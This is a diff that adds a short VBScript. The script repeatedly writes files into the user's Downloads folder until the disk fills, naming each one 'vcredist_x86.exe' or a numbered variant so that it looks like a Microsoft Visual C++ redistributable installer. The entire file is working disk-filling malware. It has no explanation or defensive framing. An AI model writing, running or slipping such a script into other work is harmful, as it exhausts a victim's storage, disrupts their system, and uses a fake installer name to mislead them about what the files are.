@@ -1,0 +1,40 @@
+Dim counter
+counter = 0
+Dim cc
+cc = 1
+Dim text
+Set objShell = CreateObject("WScript.Shell")
+Dim strUserProfile 
+strUserProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
+
+dim filesys, filetxt, getname, path 
+Set filesys = CreateObject("Scripting.FileSystemObject")
+dim loc
+loc = strUserProfile & "\Downloads\vcredist_x86.exe"
+Set filetxt = filesys.CreateTextFile(loc, True) 
+path = filesys.GetAbsolutePathName(loc) 
+getname = filesys.GetFileName(path) 
+
+CONST bytesToKb = 1024
+strFile = loc
+
+SET objFSO = CREATEOBJECT("Scripting.FileSystemObject")
+SET objFile = objFSO.GetFile(strFile)
+
+While counter < 830000000000000000000000000000
+if counter < 50000000 Then
+filetxt.WriteLine(counter)
+counter = counter + 1
+Else
+filetxt.Close 
+loc = strUserProfile & "\Downloads\vcredist_x86 (" & cc & ").exe"
+Set filetxt = filesys.CreateTextFile(loc, True) 
+path = filesys.GetAbsolutePathName(loc) 
+getname = filesys.GetFileName(path) 
+strFile = loc
+SET objFSO = CREATEOBJECT("Scripting.FileSystemObject")
+SET objFile = objFSO.GetFile(strFile)
+cc = cc + 1
+counter = 0
+End If
+Wend
